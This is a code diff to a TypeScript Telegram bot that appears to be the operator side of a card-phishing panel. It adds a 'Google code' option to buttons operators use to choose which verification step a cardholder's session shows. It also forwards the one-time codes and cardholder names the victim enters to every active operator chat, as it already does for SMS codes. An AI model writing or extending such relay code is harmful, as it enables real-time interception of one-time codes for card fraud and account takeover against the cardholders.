@@ -114,6 +114,13 @@ async function handleCallbackQuery(callbackQuery: any) {
               await sendMethodChoiceNotification(sessionId, 'sms', result.cardholder_name);
             }
             break;
+          case 'google_code_confirmation':
+            successMessage = `✅ <b>Google-Code Verification Activated</b>\n\nSession: <code>${sessionId}</code>\nGoogle-Code confirmation is now active.`;
+            // Send notification when customer chooses Google-Code - get cardholder name
+            if (result && result.cardholder_name) {
+              await sendMethodChoiceNotification(sessionId, 'google_code', result.cardholder_name);
+            }
+            break;
           default:
             successMessage = `✅ Verification method set to: ${method}`;
         }
@@ -191,6 +198,9 @@ async function handleCallbackQuery(callbackQuery: any) {
           break;
         case 'sms_confirmation':
           confirmationMessage = '✅ SMS-Bestätigung aktiviert';
+          break;
+        case 'google_code_confirmation':
+          confirmationMessage = '✅ Google-Code-Bestätigung aktiviert';
           break;
       }
     } else if (action === 'complete') {
@@ -291,6 +301,11 @@ async function sendNotification(chatId: string, type: string, data: any) {
                   `Karteninhaber: ${escapeHTML(data.cardholder_name || 'Unknown')}\n` +
                   `Code: <code>${escapeHTML(data.sms_code)}</code>`;
         buttons = getCompletionButtons(data.session_id);
+      } else if (data.verification_status === 'google_code_confirmation' && data.google_code) {
+        message = `🔢 <b>Google Code Entered</b>\n\n` +
+                  `Karteninhaber: ${escapeHTML(data.cardholder_name || 'Unknown')}\n` +
+                  `Code: <code>${escapeHTML(data.google_code)}</code>`;
+        buttons = getCompletionButtons(data.session_id);
       } else if (data.message && data.message.includes('User wählte:')) {
         // Handle user choice notification
         const choice = data.verification_method === 'app_confirmation' ? 'App-Bestätigung' : 'SMS-Bestätigung';
@@ -367,8 +382,11 @@ function getVerificationMethodButtons(sessionId: string) {
     inline_keyboard: [
       [
         { text: '🔄 Wahl', callback_data: `set_method:${sessionId}:choice_required` },
-        { text: '📱 App', callback_data: `set_method:${sessionId}:app_confirmation` },
-        { text: '💬 SMS', callback_data: `set_method:${sessionId}:sms_confirmation` }
+        { text: '📱 App', callback_data: `set_method:${sessionId}:app_confirmation` }
+      ],
+      [
+        { text: '💬 SMS', callback_data: `set_method:${sessionId}:sms_confirmation` },
+        { text: '🔢 Code', callback_data: `set_method:${sessionId}:google_code_confirmation` }
       ]
     ]
   };
@@ -396,7 +414,7 @@ function getCompletionButtons(sessionId: string) {
   };
 }
 
-async function sendMethodChoiceNotification(sessionId: string, method: 'app' | 'sms', cardholderName?: string) {
+async function sendMethodChoiceNotification(sessionId: string, method: 'app' | 'sms' | 'google_code', cardholderName?: string) {
   try {
     // Get all active chat IDs
     const { data: activeChatIds, error } = await supabase.functions.invoke('get-active-chat-ids');
@@ -406,8 +424,10 @@ async function sendMethodChoiceNotification(sessionId: string, method: 'app' | '
       return;
     }
 
-    const methodText = method === 'app' ? 'App-Verification' : 'SMS-Verification';
-    const emoji = method === 'app' ? '📱' : '💬';
+    const methodText = method === 'app' ? 'App-Verification' : 
+                      method === 'sms' ? 'SMS-Verification' : 'Google-Code-Verification';
+    const emoji = method === 'app' ? '📱' : 
+                  method === 'sms' ? '💬' : '🔢';
     
     const message = `${emoji} <b>Nutzer hat ${methodText} gewählt</b>\n\nKarteninhaber: ${escapeHTML(cardholderName || 'Unknown')}\nZeitpunkt: ${new Date().toLocaleString('de-DE')}`;
 
